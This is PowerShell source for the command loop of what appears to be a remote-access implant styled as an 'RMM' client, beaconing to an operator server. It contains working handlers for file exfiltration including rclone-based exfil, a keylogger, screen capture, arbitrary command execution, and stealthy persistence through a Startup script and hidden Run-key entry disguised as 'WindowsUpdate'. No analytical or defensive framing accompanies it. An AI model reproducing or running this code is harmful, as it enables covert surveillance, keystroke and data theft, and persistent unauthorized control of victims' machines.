        $headers["X-Request-ID"] = [System.Guid]::NewGuid().ToString()
        
        # Poll /cmd before register so a killed session gets __EXIT__ (register returns 403 TERMINATED).
        $cmdUrl = "$u/cmd?id=$sessionId"
        $response = Invoke-RmmRestMethod -Uri $cmdUrl -Method Get -Headers $headers -RestErrorAction Stop
        
        # Reset retry counter on success
        $currentRetry = 0
        
        # Invoke-RestMethod returns PSCustomObject for JSON; handle string or object
        $cmdData = Parse-CmdResponse -response $response
        $command = ([string]$cmdData.command).Trim()
        $cmdType = [string]$cmdData.type
        Sync-RmmSocksChannelFromServer -CmdData $cmdData

        if ($command -eq "__EXIT__") {
            Stop-RmmSocksChannelWorker
            Write-Host "[*] Session terminated by server; exiting client" -ForegroundColor Yellow
            exit 0
        }

        # Re-register each beacon so a restarted server re-creates the session before handling work.
        Register-RmmSession -Quiet | Out-Null
        
        if ($command -and $command -ne "") {
            if ($command -like "__CONFIG__ *") {
                $beforeSleep = $script:baseSleepSeconds
                $beforeJitter = $script:jitterPercent
                $null = Update-Configuration -configString $command
                if ($script:baseSleepSeconds -ne $beforeSleep -or $script:jitterPercent -ne $beforeJitter) {
                    $script:RmmFastPoll = $true
                }
                Sync-RmmSocksChannelFromServer -CmdData $cmdData
                continue
            }
            Write-Host "[>] Received command: $command" -ForegroundColor Cyan
            
            # Handle special commands FIRST before anything else
            if ($command -eq "__STOP__") {
                Write-Host "[*] Stopping persistent command" -ForegroundColor Yellow
                continue
            }
            elseif ($command -like "__DOWNLOAD__ *") {
                $filePath = $command.Substring(12).Trim()
                if (Test-Path $filePath -PathType Leaf) {
                    try {
                        Send-RmmFileDownload -FilePath $filePath -RemotePath $filePath -Headers $headers
                        Write-Host "[+] File exfiltrated: $filePath" -ForegroundColor Green
                    } catch {
                        $err = "Download failed: $($_.Exception.Message)"
                        Send-RmmTextResult -CommandLine $command -Text $err -Headers $headers
                        Write-Host "[-] $err" -ForegroundColor Red
                    }
                } else {
                    $errorMsg = "File not found: $filePath"
                    Send-RmmTextResult -CommandLine $command -Text $errorMsg -Headers $headers
                    Write-Host "[-] $errorMsg" -ForegroundColor Red
                }
            }
            elseif ($command -like "__EXFIL__*") {
                try {
                    $exfilResult = Invoke-RmmRcloneExfil -CommandLine $command -Headers $headers
                    if ($exfilResult.success) {
                        if ($exfilResult.link) {
                            Write-Host "[+] Exfil complete: $($exfilResult.link)" -ForegroundColor Green
                        } else {
                            Write-Host "[+] Exfil complete (see operator transcript)" -ForegroundColor Green
                        }
                    } else {
                        $err = if ($exfilResult.error) { $exfilResult.error } else { 'Exfil failed' }
                        Write-Host "[-] Exfil failed: $err" -ForegroundColor Red
                    }
                } catch {
                    $err = "Exfil failed: $($_.Exception.Message)"
                    Write-Host "[-] $err" -ForegroundColor Red
                }
            }
            elseif ($command -like "__UPLOAD__ *") {
                # File upload (receive file from RMM)
                $parts = $command -split "`n", 2
                if ($parts.Count -eq 2) {
                    $uploadCmd = $parts[0]
                    $jsonData = $parts[1]
                    $filePath = $uploadCmd.Substring(10).Trim()
                    
                    $fileData = $jsonData | ConvertFrom-Json
                    $fileBytes = [Convert]::FromBase64String($fileData.content)
                    [System.IO.File]::WriteAllBytes($filePath, $fileBytes)
                    
                    Send-RmmTextResult -CommandLine $command -Text "File uploaded successfully: $filePath" -Headers $headers
                    Write-Host "[+] File uploaded: $filePath" -ForegroundColor Green
                }
            }
            elseif ($command -eq "__SCREENSHOT__") {
                # Take screenshot
                try {
                    Add-Type -AssemblyName System.Windows.Forms
                    Add-Type -AssemblyName System.Drawing
                    
                    $screen = [System.Windows.Forms.SystemInformation]::PrimaryMonitorSize
                    $bitmap = New-Object System.Drawing.Bitmap($screen.Width, $screen.Height)
                    $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
                    $graphics.CopyFromScreen(0, 0, 0, 0, $bitmap.Size)
                    
                    $memoryStream = New-Object System.IO.MemoryStream
                    $bitmap.Save($memoryStream, [System.Drawing.Imaging.ImageFormat]::Png)
                    $screenshotBase64 = [Convert]::ToBase64String($memoryStream.ToArray())
                    
                    $graphics.Dispose()
                    $bitmap.Dispose()
                    $memoryStream.Dispose()
                    
                    $resultUrl = "$u/result?id=$sessionId&type=screenshot"
                    Invoke-RmmRestMethod -Uri $resultUrl -Method Post -Body $screenshotBase64 -Headers $headers -RestErrorAction Stop
                    Write-Host "[+] Screenshot captured and sent" -ForegroundColor Green
                } catch {
                    $errorMsg = "Screenshot failed: $_"
                    Send-RmmTextResult -CommandLine '__SCREENSHOT__' -Text $errorMsg -Headers $headers
                    Write-Host "[-] $errorMsg" -ForegroundColor Red
                }
            }
            elseif ($command -like "__KEYLOG__ *") {
                # Keylogging: job writes to a temp file (Start-Job cannot share in-memory state with parent)
                $action = $command.Substring(10).Trim()
                $klJobName = "RMM_Keylogger"
                
                if ($action -eq "start") {
                    Get-Job -Name $klJobName -ErrorAction SilentlyContinue | Stop-Job -ErrorAction SilentlyContinue
                    Get-Job -Name $klJobName -ErrorAction SilentlyContinue | Remove-Job -ErrorAction SilentlyContinue
                    
                    $prefix = if ($sessionId.Length -ge 8) { $sessionId.Substring(0, 8) } else { $sessionId }
                    $keylogPath = Join-Path $env:TEMP ("rmm_keylog_{0}.log" -f $prefix)
                    if (Test-Path -LiteralPath $keylogPath) { Remove-Item -LiteralPath $keylogPath -Force -ErrorAction SilentlyContinue }
                    
                    $scriptBlock = {
                        param([string]$path, [int]$jitterBase, [int]$jitterPct)
                        Add-Type -AssemblyName System.Windows.Forms
                        $down = @{}
                        $acc = New-Object System.Text.StringBuilder
                        while ($true) {
                            $jr = [int]($jitterBase * ($jitterPct / 100.0))
                            $jv = Get-Random -Minimum (-$jr) -Maximum ($jr + 1)
                            Start-Sleep -Milliseconds ([Math]::Max(15, 40 + $jv))
                            for ($vk = 8; $vk -lt 256; $vk++) {
                                $st = [System.Windows.Forms.Control]::GetKeyState([int]$vk)
                                $pressed = (($st -band 0x8000) -ne 0)
                                if ($pressed) {
                                    if (-not $down.ContainsKey($vk)) {
                                        $down[$vk] = $true
                                        $name = $vk.ToString()
                                        try {
                                            $ek = [System.Windows.Forms.Keys]$vk
                                            $name = $ek.ToString()
                                        } catch { }
                                        [void]$acc.Append("[$name]")
                                    }
                                } elseif ($down.ContainsKey($vk)) {
                                    $null = $down.Remove($vk)
                                }
                            }
                            if ($acc.Length -ge 400) {
                                [System.IO.File]::AppendAllText($path, $acc.ToString())
                                $acc.Clear() | Out-Null
                            }
                        }
                    }
                    Start-Job -ScriptBlock $scriptBlock -Name $klJobName -ArgumentList $keylogPath, $baseSleepSeconds, $jitterPercent | Out-Null
                    $script:rmmKeylogPath = $keylogPath
                    $result = "Keylogger started; log file: $keylogPath"
                    Send-RmmTextResult -CommandLine $command -Text $result -Headers $headers
                    Write-Host "[+] Keylogger started" -ForegroundColor Green
                }
                elseif ($action -eq "stop") {
                    Get-Job -Name $klJobName -ErrorAction SilentlyContinue | Stop-Job -ErrorAction SilentlyContinue
                    Get-Job -Name $klJobName -ErrorAction SilentlyContinue | Remove-Job -ErrorAction SilentlyContinue
                    $result = "Keylogger stopped"
                    Send-RmmTextResult -CommandLine $command -Text $result -Headers $headers
                    Write-Host "[+] Keylogger stopped" -ForegroundColor Green
                }
                elseif ($action -eq "dump") {
                    $kp = $script:rmmKeylogPath
                    if ($kp -and (Test-Path -LiteralPath $kp)) {
                        $logData = [System.IO.File]::ReadAllText($kp)
                        if (-not $logData) { $logData = "(empty buffer)" }
                        $resultUrl = "$u/result?id=$sessionId&type=keylog"
                        Invoke-RmmRestMethod -Uri $resultUrl -Method Post -Body $logData -Headers $headers -RestErrorAction SilentlyContinue
                        Write-Host "[+] Keylog data sent" -ForegroundColor Green
                    } else {
                        Send-RmmTextResult -CommandLine $command -Text "Keylogger log not found or not started" -Headers $headers
                    }
                }
            }
            elseif ($command -eq "__INSTALL_PERSIST__") {
                # Install persistence — align copied script with current $u, sleep, and jitter
                if (-not $PSCommandPath) {
                    $err = "install_persist requires running the client from a saved .ps1 file (PSCommandPath is empty)"
                    Send-RmmTextResult -CommandLine '__INSTALL_PERSIST__' -Text $err -Headers $headers
                    Write-Host "[-] $err" -ForegroundColor Red
                }
                else {
                $startupDir = [Environment]::GetFolderPath('Startup')
                $scriptPath = Join-Path $startupDir 'windowsUpdate.ps1'
                $currentScript = Get-Content -LiteralPath $PSCommandPath -Raw -ErrorAction Stop
                $uEsc = $u -replace '''', ''''''
                $currentScript = $currentScript -replace '(?m)^\s*\$u\s*=\s*.+$', ('$u = ''{0}''' -f $uEsc)
                $currentScript = $currentScript -replace '(?m)^\s*\$baseSleepSeconds\s*=\s*\d+', ('$baseSleepSeconds = {0}' -f $baseSleepSeconds)
                $currentScript = $currentScript -replace '(?m)^\s*\$jitterPercent\s*=\s*\d+', ('$jitterPercent = {0}' -f $jitterPercent)
                $ph = if ($script:UsePersistentHttp) { '$true' } else { '$false' }
                $currentScript = $currentScript -replace '(?m)^\s*\$persistentHttp\s*=\s*\$(?:true|false)\s*$', ('$persistentHttp = {0}' -f $ph)
                $proxyEsc = $httpProxy -replace '''', ''''''
                $currentScript = $currentScript -replace '(?m)^\s*\$httpProxy\s*=\s*.+$', ('$httpProxy = ''{0}''' -f $proxyEsc)
                Set-Content -LiteralPath $scriptPath -Value $currentScript -Encoding UTF8 -Force
                
                $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
                Set-ItemProperty -Path $regPath -Name "WindowsUpdate" -Value "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$scriptPath`""
                
                $result = "Persistence installed successfully"
                Send-RmmTextResult -CommandLine '__INSTALL_PERSIST__' -Text $result -Headers $headers
                Write-Host "[+] Persistence installed" -ForegroundColor Green
                }
            }
            elseif ($command -eq "__REMOVE_PERSIST__") {
                # Remove persistence
                $startupDir = [Environment]::GetFolderPath('Startup')
                $scriptPath = Join-Path $startupDir 'windowsUpdate.ps1'
                if (Test-Path -LiteralPath $scriptPath) {
                    Remove-Item -LiteralPath $scriptPath -Force
                }
                
                $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
                Remove-ItemProperty -Path $regPath -Name "WindowsUpdate" -ErrorAction SilentlyContinue
                
                $result = "Persistence removed"
                Send-RmmTextResult -CommandLine '__REMOVE_PERSIST__' -Text $result -Headers $headers
                Write-Host "[+] Persistence removed" -ForegroundColor Green
            }
            elseif (Test-RmmInternalCommand -Line $command) {
                Write-Host "[!] Unhandled internal command (ignored): $command" -ForegroundColor Yellow
            }
            else {
                # CMD by default; PS:/powershell:/pwsh:/cmd: — see Invoke-RmmUserCommand
                try {
                    $result = [string](Invoke-RmmUserCommand -RawCommand $command)
                    if (-not $result.Trim()) {
                        $result = "Command executed successfully (no output)"
                    }
                } catch {
                    $result = [string]$_.Exception.Message
                }
                
                # Send result back to RMM (JSON includes command line so queued runs are labeled on the server)
                if (Send-RmmTextResult -CommandLine $command -Text $result -Headers $headers) {
                    Write-Host "[+] Result sent to RMM" -ForegroundColor Green
                }
            }
        }

        Drain-RmmSocksHostLog
        
    } catch {
        [RmmHostAnchor]::Restore()
        if (Test-RmmSessionTerminated -ErrorRecord $_) {
            Write-Host "[*] Session killed on server (TERMINATED); exiting" -ForegroundColor Yellow
            exit 0
        }

        Write-Host "[!] Communication error (retrying indefinitely): $($_.Exception.Message)" -ForegroundColor Yellow
        Write-RmmHttpFailure -ErrorRecord $_ -Context "beacon"

        try {
            if (Register-RmmSession -Quiet -Reconnect) {
                $script:RmmFastPoll = $true
                $currentRetry = 0
                continue
            }
        } catch {
            if (Test-RmmSessionTerminated -ErrorRecord $_) {
                Write-Host "[*] Session killed on server (TERMINATED); exiting" -ForegroundColor Yellow
                exit 0
            }
            Write-RmmHttpFailure -ErrorRecord $_ -Context "re-register"
        }

        $currentRetry++
        $backoffTime = Get-BackoffSleep -retryCount $currentRetry
        if ($currentRetry -le $maxRetries) {
            Write-Host "[*] Backing off $backoffTime seconds, then retry (attempt $currentRetry/$maxRetries)..." -ForegroundColor Yellow
        } else {
            Write-Host "[*] Server still down — long backoff $backoffTime seconds, then retry..." -ForegroundColor Yellow
            $currentRetry = 0
        }
    }
} 

